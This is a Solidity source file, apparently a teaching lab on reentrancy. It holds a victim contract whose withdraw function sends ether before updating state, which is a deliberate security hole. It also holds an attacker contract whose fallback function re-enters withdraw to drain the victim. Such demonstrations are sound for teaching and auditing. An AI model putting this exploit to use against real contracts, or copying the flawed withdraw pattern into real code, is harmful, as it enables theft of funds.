//SPDX-License-Identifier: GPL-3.0

pragma solidity^0.5.8;

contract VictimContractInterface {
    function withdraw() public payable;
}

contract VictimContract {
    uint256 toTransfer = 1 ether;
    uint256 balanceRecieved;

    function withdraw() public payable {

        msg.sender.call.value(toTransfer)("");
        // Deduct balance by 1
        toTransfer = 0;
    }

    function deposit() public payable {
 //       balanceRecieved += msg.value;
    }
}

contract AttackerContract {
    address victim;

//    event AttackRound (uint time, uint value);
//    uint i = 0;
    constructor (address _victim) public {
        victim = _victim;
    }

    function attack() public payable {
        // Fill in the blanks
        VictimContractInterface(victim).withdraw();
    }

    function () external payable {
        // Fill in the blanks
        if (address(victim).balance >= 1 ether) {
            this.attack();
//            i = i + 1;
//            emit AttackRound(i, address(this).balance);
        } else {
            return;
        }
    }

    function getAttackerBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getVictimBalance() public view returns (uint){
        return address(victim).balance;
    }
}